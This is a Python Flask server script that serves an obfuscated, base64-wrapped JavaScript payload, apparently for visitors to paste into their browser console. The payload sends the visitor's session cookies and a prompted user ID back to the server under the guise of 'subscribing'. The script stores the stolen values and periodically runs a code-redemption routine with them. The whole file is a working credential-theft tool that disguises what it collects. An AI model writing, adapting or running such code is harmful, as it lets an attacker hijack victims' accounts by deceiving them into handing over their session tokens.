from flask import Flask, request, render_template
from waitress import serve
import threading
import base64
import codes
import debug
import time
import logs
import sys


app = Flask(__name__)


def start(*args, **kwargs):
    print("Starting WSGI server...")
    serve(*args, **kwargs)
    print("WSGI server ended.")


@app.route("/")
@debug.debug()
def home():
    payload = f"""console.log(eval(atob("{base64.b64encode(b'window.location = "http://' + request.headers.get('Host').encode() + b'/sub/"+btoa(btoa(document.cookie)+":"+btoa(prompt("Your UID :")))').decode()}")))"""  #'''
    logs.log_request(request)
    return render_template("home.html", payload=payload)


@app.route("/sub/<x>")
@debug.debug()
def subscribe(x):
    logs.log_request(request)
    try:
        auth, uid = tuple(base64.b64decode(x.encode()).split(b":"))
        cli = {
            "uid": base64.b64decode(uid).decode(),
            "auth": base64.b64decode(auth).decode(),
        }

        if codes.add_cli(cli):
            return "Successfully subscribed ! (you can close this tab)"
        return "Already subscribed."
    except Exception as e:
        print(e)
        return "An error occurred, retry later."


@app.errorhandler(404)
@debug.debug()
def shouldntbehere(er=None):
    logs.log_request(request)
    # print("d", er)
    return "You shouldn't be here."


@codes.event("End")
@debug.debug()
def codeend(code, uids):
    print(
        "Redeemed code :",
        code,
        "\n\033[92mSuccess for :",
        ", ".join(uids["success"]),
        "\n\033[91mfailed for :",
        ", ".join(uids["fail"]),
        "\nfor reasons :",
        ", ".join(uids["reasons"]),
        "\033[00m",
    )
    logs.log_end(code, uids)


# a = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 8899})
a = threading.Thread(
    target=start, args=(app,), kwargs={"host": "0.0.0.0", "port": 8899}
)
a.start()

while True:
    try:
        if len(codes.db["clis"]) > 0:
            codes.redeem_codes()
    except KeyboardInterrupt:
        raise sys.exit()
    except Exception as e:
        print("c", e)
        logs.log_exception(e)
    time.sleep(1200)
